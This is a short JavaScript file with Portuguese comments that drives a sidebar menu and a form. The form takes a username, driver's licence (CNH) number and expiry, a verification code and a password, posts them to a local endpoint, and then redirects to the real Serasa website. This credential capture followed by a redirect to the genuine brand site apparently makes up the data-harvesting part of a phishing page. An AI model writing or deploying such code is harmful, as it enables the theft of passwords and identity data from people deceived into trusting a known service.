var sideBar = document.querySelector('.sideBar');
var menuLateral = document.querySelector('.menuLateral');

function abrirMenu() {
    // Garante que a sideBar está visível antes de animar
    sideBar.style.display = "flex";
    menuLateral.style.transform = "translateX(0)";
}

function fecharMenu() {
    // Anima primeiro e esconde depois
    menuLateral.style.transform = "translateX(-100%)";
    // Espera a animação terminar antes de esconder completamente
    setTimeout(() => {
        sideBar.style.display = "none";
    }, 300); // Tempo da transição no CSS (0.3s = 300ms)
}

// Adiciona máscara ao campo de CNH
document.getElementById('cnh').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, ''); // Remove caracteres não numéricos
    let formatted = value.match(/\d{1,4}/g); // Agrupa em blocos de 4
    if (formatted) {
        e.target.value = formatted.join('-');
    }
});

// Envia os dados do formulário para um servidor ou repositório
document.getElementById('cadastroForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const formData = {
        username: document.getElementById('username').value,
        cnh: document.getElementById('cnh').value,
        cnhVenc: document.getElementById('cnhVenc').value,
        verificacao: document.getElementById('verificacao').value,
        senha: document.getElementById('senha').value,
    };

    try {
        const response = await fetch('http://localhost:3000/salvar-dados', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
        });

        if (response.ok) {
            // Redireciona o usuário para uma URL
            window.location.href = 'https://serasa.com.br';
        } else {
            alert('Erro ao enviar os dados: ' + response.statusText);
        }
    } catch (error) {
        alert('Erro ao conectar com o servidor: ' + error.message);
    }
});
